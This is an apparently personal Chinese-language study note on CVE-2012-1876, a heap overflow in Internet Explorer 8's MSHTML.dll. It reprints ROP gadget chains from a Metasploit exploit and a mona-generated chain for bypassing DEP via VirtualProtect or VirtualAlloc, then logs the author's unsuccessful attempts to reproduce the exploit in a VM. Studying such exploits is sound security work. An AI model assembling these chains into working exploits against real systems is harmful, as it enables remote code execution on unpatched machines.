---
layout:     post
title:      漏洞战争-cve-2012-1876
date:       2016-12-05
summary:    漏洞战争-cve-2012-1876
categories: 二进制
tags:
 - bin
 - js
 - ie
---

### About

```
目标:Internet Explorer 8
目的:利用js绕过dep+aslr
漏洞源:MSHTML.dll
漏洞情况:
	Microsoft Internet Explorer 6到9和10 Consumer Preview没有正确处理内存中的对象,这允许远程攻击者通过尝试访问
	不存在的对象来执行任意代码,导致基于堆的缓冲区溢出,也称为"Col元素远程代码执行漏洞"
```

### 分析

```
书中在绕过dep的+aslr的时候有两次溢出,第一次是为了得到mshtml.dll的基址以便构造rop gadgets绕过dep,但是在msf的exp中
没有这个步骤,msf直接使用msvcrt.dll或jre.dll来绕过dep,尝试在实际环境中用mona获取msvcrt.dll的rop gadgets,发现获得
的rop gadgets结果与msf中的并不一致,如下:
msf的exp中的rop:

	  when :msvcrt
        print_status("Using msvcrt ROP")
        exec_size = code.length
        rop =
          [
            0x77c4ec01, # retn
            0x77c4ec00, # pop ebp; retn
            0x77c15ed5, # xchg eax,esp; retn (pivot)
            0x77c4e392, # pop eax; retn
            0x77c11120, # <- *&VirtualProtect()
            0x77c2e493, # mov eax, dword ptr ds:[eax]; pop ebp; retn
            junk,
            0x77c2dd6c,
            0x77c4ec00, # pop ebp; retn
            0x77c35459, # ptr to 'push esp; ret'
            0x77c47705, # pop ebx; retn
            exec_size,  # ebx
            0x77c3ea01, # pop ecx; retn
            0x77c5d000, # W pointer (lpOldProtect) (-> ecx)
            0x77c46100, # pop edi; retn
            0x77c46101, # rop nop (-> edi)
            0x77c4d680, # pop edx; retn
            0x00000040, # newProtect (0x40) (-> edx)
            0x77c4e392, # pop eax; retn
            nop,        # nops (-> eax)
            0x77c12df9  # pushad; retn
          ].pack("V*")
      when :jre
        print_status("Using JRE ROP")
        exec_size = code.length
        rop =
          [
            0x7c346c0b, # retn
            0x7c36f970, # pop ebp; retn
            0x7c348b05, # xchg eax,esp; retn (pivot)
            0x7c36f970, # pop ebp; retn [MSVCR71.dll]
            0x7c36f970, # skip 4 bytes [MSVCR71.dll]
            0x7c34373a, # pop ebx ; retn [MSVCR71.dll]
            exec_size,  # ebx
            0x7c3444d0, # pop edx ; retn [MSVCR71.dll]
            0x00000040, # 0x00000040-> edx
            0x7c361829, # pop ecx ; retn [MSVCR71.dll]
            0x7c38f036, # &Writable location [MSVCR71.dll]
            0x7c342766, # pop edi ; retn [MSVCR71.dll]
            0x7c346c0b, # retn (rop nop) [MSVCR71.dll]
            0x7c350564, # pop esi ; retn [MSVCR71.dll]
            0x7c3415a2, # jmp [eax] [MSVCR71.dll]
            0x7c3766ff, # pop eax ; retn [MSVCR71.dll]
            0x7c37a151, # ptr to &VirtualProtect() - 0x0ef [IAT msvcr71.dll]
            0x7c378c81, # pushad # add al,0ef ; retn [MSVCR71.dll]
            0x7c345c30  # ptr to 'push esp; ret ' [MSVCR71.dll]
          ].pack("V*")

虚拟机中(win7x64+immunity debugger32+python32+mona)用如下命令获取的rop gadgets:
command:!mona rop -m msvcrt.dll -cp nonull
rop gadgets:

		 def create_rop_chain()

		   # rop chain generated with mona.py - www.corelan.be
		   rop_gadgets =
		   [
			 0x7788ea09,  # POP EBP # RETN [msvcrt.dll]
			 0x7788ea09,  # skip 4 bytes [msvcrt.dll]
			 0x778afd36,  # POP EAX # RETN [msvcrt.dll]
			 0x3974ffff,  # put delta into eax (-> put 0x00000001 into ebx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7788d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll]
			 0x7785f5d4,  # POP EAX # RETN [msvcrt.dll]
			 0x39750ffe,  # put delta into eax (-> put 0x00001000 into edx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7786ad98,  # XCHG EAX,EDX # RETN [msvcrt.dll]
			 0x7785aeba,  # POP EAX # RETN [msvcrt.dll]
			 0xa2a7fcd6,  # put delta into eax (-> put 0x00000040 into ecx)
			 0x778b950f,  # ADD EAX,5D58036A # RETN [msvcrt.dll]
			 0x7784b984,  # XCHG EAX,ECX # ADD AL,5D # RETN 0x04 [msvcrt.dll]
			 0x77850a31,  # POP EDI # RETN [msvcrt.dll]
			 0x41414141,  # Filler (RETN offset compensation)
			 0x77829f09,  # RETN (ROP NOP) [msvcrt.dll]
			 0x7787c433,  # POP ESI # RETN [msvcrt.dll]
			 0x7782b7bd,  # JMP [EAX] [msvcrt.dll]
			 0x77851a3a,  # POP EAX # RETN [msvcrt.dll]
			 0x778211bc,  # ptr to &VirtualAlloc() [IAT msvcrt.dll]
			 0x77885cfc,  # PUSHAD # RETN [msvcrt.dll]
			 0x778530ad,  # ptr to 'call esp' [msvcrt.dll]
		   ].flatten.pack("V*")

		   return rop_gadgets

		 end
发现rop gadgets的地址并不一样,在msf中测试msf的exp是否有效,结果win7x64中的iex32并没有成功溢出,而是停止工作了,这
里查看系统是否开了dep,发现是开了的,难道msf中的exp不支持绕过dep?为了验证,将win7x64中dep关闭(要重启),重新测试msf
的exp,发现还是无法成功溢出,ie和之前一样出现异常而停止工作,后来看到书中配套资料中的rb文件是和msf中的rb文件不一样
的,msf中的rb文件应该是依靠没有启用aslr模块(msvcrt或jre)来一次溢出利用的,不过msf中的rb在本机测试并没有用,后来重
新测试书中配套资料中的rb文件,该rb文件是二次溢出来利用漏洞,第一次溢出找到模块基址,第二次溢出控制代码执行流程,但
是在本机测试依然失败,尝试换成x32系统,仍然失败,后来觉得可能是系统已经安装了补丁,但是systeminfo | find
"2699988"没有找到,不知为何会出现这种情况,尝试将系统补丁全部删除,再试.
```
